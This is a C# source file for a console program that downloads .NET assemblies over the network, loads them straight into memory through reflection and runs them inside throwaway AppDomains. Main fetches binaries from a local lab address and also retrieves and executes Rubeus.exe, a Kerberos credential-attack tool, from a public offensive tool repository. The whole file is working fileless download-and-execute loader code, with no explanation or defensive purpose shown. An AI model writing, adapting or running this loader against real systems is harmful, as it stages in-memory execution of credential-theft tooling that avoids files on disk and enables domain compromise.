using System;
using System.Reflection;
using System.Net;
using System.Threading;

namespace Cell
{
    class Program
    {
        public class Worker : MarshalByRefObject
        {
            public  void ReflectFromWeb(string url, int retrycount=0, int timeoutTimer=0)
            {
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                WebClient client = new WebClient();
                byte[] programBytes = null;
                while (retrycount >= 0 && programBytes == null)
                {
                    try
                    {
                        programBytes = client.DownloadData(url);
                    }
                    catch (WebException ex)
                    {
                        Console.WriteLine("Assembly not found yet. sleeping for {0} seconds and retrying another {1} time(s)...", timeoutTimer, retrycount);
                        retrycount--;
                        Thread.Sleep(timeoutTimer * 1000);
                    }
                }
                if (programBytes == null)
                {
                    Console.WriteLine("Assembly was not found, exitting now...");
                    Environment.Exit(-1);
                }
                Assembly dotnetProgram = Assembly.Load(programBytes);
                object[] parameters = new String[] { null };
                dotnetProgram.EntryPoint.Invoke(null, parameters);
            }
        }
    
        static void Main(string[] args)
        {
            AppDomain namek = AppDomain.CreateDomain("Namek");
            Console.WriteLine("Appdomain Namek created!");
            Console.ReadKey();
            Worker remoteWorker = (Worker)namek.CreateInstanceAndUnwrap(typeof(Worker).Assembly.FullName, new Worker().GetType().FullName);
            remoteWorker.ReflectFromWeb("http://10.0.2.15/HelloReflectionWorld.exe");
            Console.ReadKey();
            Console.WriteLine("Unloaded Namek!");
            AppDomain.Unload(namek);
            Console.ReadKey();
            AppDomain snakeWay = AppDomain.CreateDomain("SnakeWay");
            Console.WriteLine("Appdomain SnakeWay created!");
            remoteWorker = (Worker)snakeWay.CreateInstanceAndUnwrap(typeof(Worker).Assembly.FullName, new Worker().GetType().FullName);
            Console.ReadKey();
            remoteWorker.ReflectFromWeb("http://10.0.2.15/mscorlib.exe");
            remoteWorker.ReflectFromWeb("https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_Any/Rubeus.exe");
            Console.WriteLine("Unloaded SnakeWay!");
            Console.ReadKey();
        }
    }
}
